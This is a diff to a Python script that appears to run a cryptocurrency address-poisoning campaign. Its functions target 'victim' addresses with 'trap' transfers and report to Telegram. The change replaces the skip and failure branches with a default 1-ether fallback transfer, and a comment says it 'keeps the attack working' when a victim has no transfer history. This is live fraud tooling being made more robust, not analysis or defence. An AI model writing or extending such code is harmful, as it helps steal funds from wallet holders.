@@ -1142,8 +1142,11 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
         
         if not fetched_asset or not fetched_amount:
-            logger.warning(f"[{i}/{total}] No transfer found for {victim}, skipping")
-            continue
+            # 🆕 Use default fallback: emit a small native transfer
+            # Keeps the attack working even without real transfer history
+            logger.info(f"[{i}/{total}] No transfer found for {victim}, using default {NATIVE_SYMBOL} fallback")
+            fetched_asset = NATIVE_SYMBOL
+            fetched_amount = w3.to_wei(1, 'ether')
         
         logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
         
@@ -1262,12 +1265,10 @@ if __name__ == "__main__":
         fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
 
         if not fetched_asset or not fetched_amount:
-            error_msg = f"❌ Mirror failed: No transfer found from {args.victim_address} to {counterparty}"
-            logger.error(error_msg)
-            send_telegram(error_msg, campaign_id=campaign_id)
-            if job_id:
-                update_job(job_id, status='failed', message='No transfer found')
-            sys.exit(1)
+            # 🆕 Use default fallback: emit a small native transfer
+            logger.info(f"[mirror] No transfer found, using default {NATIVE_SYMBOL} fallback (1 {NATIVE_SYMBOL})")
+            fetched_asset = NATIVE_SYMBOL
+            fetched_amount = w3.to_wei(1, 'ether')
 
         logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
 
